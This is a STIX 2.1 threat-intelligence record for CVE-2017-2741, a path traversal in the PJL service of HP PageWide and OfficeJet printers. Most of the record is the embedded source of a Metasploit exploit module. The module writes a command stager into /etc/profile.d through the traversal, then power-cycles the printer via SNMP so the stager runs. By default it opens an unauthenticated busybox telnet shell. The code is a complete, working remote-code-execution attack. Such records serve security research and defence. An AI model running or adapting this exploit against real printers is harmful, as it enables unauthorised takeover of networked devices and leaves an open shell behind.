{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9a207417-d767-4ec5-b466-c325c21a2cf3",
    "created": "2024-08-14T16:57:19.390368Z",
    "modified": "2024-08-14T16:57:19.390372Z",
    "name": "HP Jetdirect Path Traversal Arbitrary Code Execution",
    "description": " The module exploits a path traversal via Jetdirect to gain arbitrary code execution by writing a shell script that is loaded on startup to /etc/profile.d. Then, the printer is restarted using SNMP. Impacted printers: HP PageWide Managed MFP P57750dw HP PageWide Managed P55250dw HP PageWide Pro MFP 577z HP PageWide Pro 552dw HP PageWide Pro MFP 577dw HP PageWide Pro MFP 477dw HP PageWide Pro 452dw HP PageWide Pro MFP 477dn HP PageWide Pro 452dn HP PageWide MFP 377dw HP PageWide 352dw HP OfficeJet Pro 8730 All-in-One Printer HP OfficeJet Pro 8740 All-in-One Printer HP OfficeJet Pro 8210 Printer HP OfficeJet Pro 8216 Printer HP OfficeJet Pro 8218 Printer  Please read the module documentation regarding the possibility for leaving an unauthenticated telnetd service running as a side effect of this exploit. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/hp_jetdirect_path_traversal.rb",
            "external_id": "hp_jetdirect_path_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-2741"
        },
        {
            "source_name": "reference",
            "url": "https://support.hp.com/lt-en/document/c05462914"
        },
        {
            "source_name": "reference",
            "url": "http://tenable.com/blog/rooting-a-printer-from-security-bulletin-to-remote-code-execution"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire \"rex/proto/pjl\"\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::SNMPClient\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP Jetdirect Path Traversal Arbitrary Code Execution',\n      'Description'    => %q{\n        The module exploits a path traversal via Jetdirect to gain arbitrary code execution by\n        writing a shell script that is loaded on startup to /etc/profile.d. Then, the printer\n        is restarted using SNMP. Impacted printers:\n        HP PageWide Managed MFP P57750dw\n        HP PageWide Managed P55250dw\n        HP PageWide Pro MFP 577z\n        HP PageWide Pro 552dw\n        HP PageWide Pro MFP 577dw\n        HP PageWide Pro MFP 477dw\n        HP PageWide Pro 452dw\n        HP PageWide Pro MFP 477dn\n        HP PageWide Pro 452dn\n        HP PageWide MFP 377dw\n        HP PageWide 352dw\n        HP OfficeJet Pro 8730 All-in-One Printer\n        HP OfficeJet Pro 8740 All-in-One Printer\n        HP OfficeJet Pro 8210 Printer\n        HP OfficeJet Pro 8216 Printer\n        HP OfficeJet Pro 8218 Printer\n\n        Please read the module documentation regarding the possibility for leaving an\n        unauthenticated telnetd service running as a side effect of this exploit.\n      },\n      'Author'         => [\n        'Jacob Baines', # Python PoC\n        'Matthew Kienow <matthew_kienow[AT]rapid7.com>', # Metasploit module\n       ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2017-2741' ],\n          [ 'URL', 'https://support.hp.com/lt-en/document/c05462914' ],\n          [ 'URL', 'http://tenable.com/blog/rooting-a-printer-from-security-bulletin-to-remote-code-execution' ]\n        ],\n      'Targets'        => [\n        ['Unix (In-Memory)',\n          'Platform'   => 'unix',\n          'Arch'       => ARCH_CMD,\n          'Payload'    => {\n            'Compat' => {\n              'PayloadType' => 'cmd'\n            }\n          },\n        ]\n      ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2017-04-05',\n      'DefaultTarget'  => 0,\n      'DefaultOptions' => {\n        'PAYLOAD'  => 'cmd/unix/bind_busybox_telnetd',\n        'WfsDelay' => 180\n      }\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(Rex::Proto::PJL::DEFAULT_PORT),\n        OptPort.new('SNMPPORT', [true, 'The SNMP port', 161])\n      ]\n    )\n  end\n\n  def execute_command(cmd, opts = {})\n    rpath = '0:/../../rw/var/etc/profile.d/'\n    stager_script_name = opts[:stager_script_name]\n    cmd = \"(cd / && #{cmd}); rm -f /etc/profile.d/#{stager_script_name}\"\n\n    begin\n      # use PJL to write command stager\n      print_status(\"Connecting to port #{rport}...\")\n\n      pjl = Rex::Proto::PJL::Client.new(sock)\n      pjl.begin_job\n\n      pjl.fsinit(rpath[0..1])\n\n      print_status(\"Attempting to write command stager...\")\n      rpath = \"#{rpath}#{stager_script_name}\"\n      if pjl.fsdownload(cmd, rpath, is_file: false)\n        print_good(\"Successfully wrote command stager to #{rpath}\")\n      else\n        print_error(\"Failed to write command stager to #{rpath}\")\n        return\n      end\n\n      # verify command stager exists\n      unless pjl.fsquery(rpath)\n        print_error(\"Command stager does not exist at #{rpath}; aborting...\")\n        return\n      end\n\n      pjl.end_job\n\n    rescue Rex::ConnectionError\n      print_error(\"Connection Refused\")\n      raise\n    end\n  end\n\n  def restart_printer\n    pjl_port = datastore['RPORT']\n    snmp_port = datastore['SNMPPORT']\n    community = datastore['COMMUNITY']\n    # Printer MIB prtGeneralReset object identifier (numeric notation)\n    prt_general_reset = '1.3.6.1.2.1.43.5.1.1.3.1'\n    # prtGeneralReset powerCycleReset(4) value\n    power_cycle_reset = 4\n\n    begin\n      # TODO: Update when there is a clean approach to using two or more mixins that both use RPORT.\n      datastore['RPORT'] = snmp_port\n      print_status(\"Connecting to SNMP port #{rport}...\")\n      snmp = connect_snmp\n\n      # get value of Printer MIB prtGeneralReset\n      reset_value = snmp.get_value(prt_general_reset)\n      reset_value = \"''\" if reset_value.is_a?(SNMP::Null)\n      print_status(\"Initial value of prtGeneralReset OID #{prt_general_reset} => #{reset_value}\")\n\n      # set value of Printer MIB prtGeneralReset to powerCycleReset(4)\n      print_status(\"Attempting to restart printer via SNMP...\")\n      varbind = SNMP::VarBind.new(prt_general_reset, SNMP::Integer.new(power_cycle_reset))\n      response = snmp.set(varbind)\n\n      if response.error_status == :noError\n        print_status(\"Set prtGeneralReset OID #{prt_general_reset} => #{power_cycle_reset}\")\n\n        # get value of Printer MIB prtGeneralReset\n        reset_value = snmp.get_value(prt_general_reset)\n        reset_value = \"''\" if reset_value.is_a?(SNMP::Null)\n        print_status(\"Current value of prtGeneralReset OID #{prt_general_reset} => #{reset_value}\")\n        print_status(\"Printer restarting...\")\n\n      else\n        print_error(\"Unable to set prtGeneralReset; SNMP response error status: #{response.error_status}\")\n      end\n\n    rescue SNMP::RequestTimeout\n      print_error(\"SNMP request timeout with community '#{community}'\")\n      raise\n    rescue SNMP::UnsupportedVersion\n      print_error(\"Unsupported SNMP version specified; use '1' or '2c'\")\n      raise\n    rescue Rex::ConnectionError\n      print_error(\"Connection Refused\")\n      raise\n    ensure\n      # restore original rport value\n      datastore['RPORT'] = pjl_port\n    end\n  end\n\n  def exploit\n    begin\n      opts = {\n        stager_script_name: \"#{Rex::Text.rand_text_alpha(8)}.sh\"\n      }\n\n      print_status(\"Exploiting...\")\n      connect\n      if target.name =~ /Unix/\n        execute_command(payload.encoded, opts)\n      else\n        execute_cmdstager(opts)\n      end\n      restart_printer\n\n      return\n    ensure\n      disconnect\n    end\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2017-04-05",
    "x_mitre_platforms": [
        "unix'"
    ]
}